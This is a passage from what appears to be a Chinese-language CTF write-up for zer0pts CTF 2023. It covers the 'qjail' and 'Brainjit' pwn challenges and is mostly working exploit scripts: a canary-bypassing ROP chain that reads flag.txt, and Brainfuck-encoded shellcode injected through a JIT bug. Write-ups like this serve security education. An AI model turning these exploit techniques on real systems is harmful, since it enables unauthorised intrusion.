</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=s2>&#34;1234567890=/&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>test</span><span class=p>(</span><span class=s2>&#34;env.FLAG&#34;</span><span class=p>,</span><span class=n>j</span><span class=p>,</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flagb64</span> <span class=o>+=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flagb64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn>Pwn</h2><h3 id=qjail>qjail</h3><p>看qiling源码
在loader/elf.py里是他的elf加载逻辑
​<img src=/img/2023-07-15zer0ptsCTF/1.png alt=image></p><p>根据经验AT_RANDOM的值指向canary</p><p><img src=/img/2023-07-15zer0ptsCTF/2.png alt=image></p><p>往上翻可以看见randstraddr的来源
能够猜+试出来canary是7个a和一个00
elf加载地址在qiling的profile里的linux profile</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span><span class=n>OS64</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>stack_address</span> <span class=o>=</span> <span class=mh>0x7ffffffde000</span>
</span></span><span class=line><span class=cl><span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x30000</span>
</span></span><span class=line><span class=cl><span class=n>load_address</span> <span class=o>=</span> <span class=mh>0x555555554000</span>
</span></span><span class=line><span class=cl><span class=n>interp_address</span> <span class=o>=</span> <span class=mh>0x7ffff7dd5000</span>
</span></span><span class=line><span class=cl><span class=n>mmap_address</span> <span class=o>=</span> <span class=mh>0x7fffb7dd6000</span>
</span></span><span class=line><span class=cl><span class=n>vsyscall_address</span> <span class=o>=</span> <span class=mh>0xffffffffff600000</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pie</span> <span class=o>=</span> <span class=mh>0x555555554000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s1>&#39;./sandbox.py&#39;</span><span class=p>,</span><span class=s1>&#39;bin/vuln&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;bin/vuln&#39;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x00000000000012a3</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=n>pie</span> <span class=o>+</span> <span class=mh>0x11a9</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x109</span><span class=p>:</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x118</span><span class=p>:[</span>
</span></span><span class=line><span class=cl>        <span class=c1># pop_rdi,</span>
</span></span><span class=line><span class=cl>        <span class=c1># 0x33,</span>
</span></span><span class=line><span class=cl>        <span class=c1># pie+0x10c0,</span>
</span></span><span class=line><span class=cl>        <span class=c1># elf.plt[&#39;puts&#39;],</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xdeadbeef</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>},</span><span class=n>filler</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># payload = b&#39;\x00&#39; * 0x100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;something</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>但是目前发现pop rdi会报unicorn的READ error
不太确定libc是不是固定的，还没从源码中看到这部分
重回main好像也不太得劲
qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围
这个结论是通过qiling的gdb server调试观察到的，https://docs.qiling.io/en/latest/debugger/
然后就是直接看出其他段的地址，应该都是不变的
重新算地址，pop rdi，重回main都没问题了
system会有点问题，所以最后orw读flag.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pie</span> <span class=o>=</span> <span class=mh>0x7fffb7dd6000</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=mh>0x7fffb7ddb000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sh = process([&#39;./sandbox.py&#39;,&#39;bin/vuln&#39;])</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwn.2023.zer0pts.com&#39;</span><span class=p>,</span><span class=s1>&#39;9005&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;bin/vuln&#39;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x00000000000012a3</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=n>pie</span> <span class=o>+</span> <span class=mh>0x11a9</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;lib/libc.so.6&#39;</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000002601f</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x0000000000142c92</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>str_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0x000000000010257e: pop rcx; pop rbx; ret; </span>
</span></span><span class=line><span class=cl><span class=n>pop_rcx_rbx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000010257e</span>
</span></span><span class=line><span class=cl><span class=c1># 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; </span>
</span></span><span class=line><span class=cl><span class=n>mov_rdi_rax</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000005b622</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buff</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>(</span><span class=mh>0x180</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x109</span><span class=p>:</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x118</span><span class=p>:[</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rsi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>str_addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdx</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>str_addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rsi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pop_rcx_rbx</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x81</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdx</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x80</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rsi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>buff</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>mov_rdi_rax</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rsi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>buff</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdx</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x80</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;exit&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>},</span><span class=n>filler</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;something</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;./flag.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=brainjit>Brainjit</h3><p>Brainfxxk jit编译器
有个功能是为多个连续的操作独立生成汇编，length标识重复长度
<img src=/img/2023-07-15zer0ptsCTF/3.png alt=image>
但是这个32位的length如果最高byte是有符号似乎就会有点问题
不知道是不是漏洞
<img src=/img/2023-07-15zer0ptsCTF/4.png alt=image>
但是经过调试后面这种方法py里check了write写入不能超过0x8000，emmm
貌似只有 &rsquo; [ &rsquo; 没有 &rsquo; ] &lsquo;的时候会出现点问题，可以跳到jz指令的0xff上，跟后面的指令偏一下，但我找了半天没有找到可以合理的偏出想要的指令的
就是上面这种方法做的
但是偏起来挺jb的。。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># sh = process([&#39;./app.py&#39;])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=n>adjust</span><span class=p>,</span><span class=n>v</span><span class=p>,</span><span class=n>old</span><span class=o>=</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=s1>&#39;&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>adjust</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=s1>&#39;&lt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>adjust</span> <span class=o>=</span> <span class=nb>abs</span><span class=p>(</span><span class=n>adjust</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>d</span> <span class=o>*</span> <span class=n>adjust</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>old</span> <span class=o>!=</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>old</span> <span class=o>&gt;</span> <span class=n>v</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;-&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>old</span><span class=o>-</span><span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;+&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>v</span><span class=o>-</span><span class=n>old</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl><span class=c1># sc = asm(shellcraft.sh())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># for i in sc:</span>
</span></span><span class=line><span class=cl><span class=c1>#     print(&#34;code += &#39;&#34; + write(1,i) + &#34;&#39;&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;[+&#39;</span> <span class=o>+</span> <span class=s1>&#39;&gt;&#39;</span> <span class=o>*</span> <span class=mh>0x5558</span>
</span></span><span class=line><span class=cl><span class=c1># pop rax</span>
</span></span><span class=line><span class=cl><span class=c1># push rbp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># shellcode</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+&#39;</span>
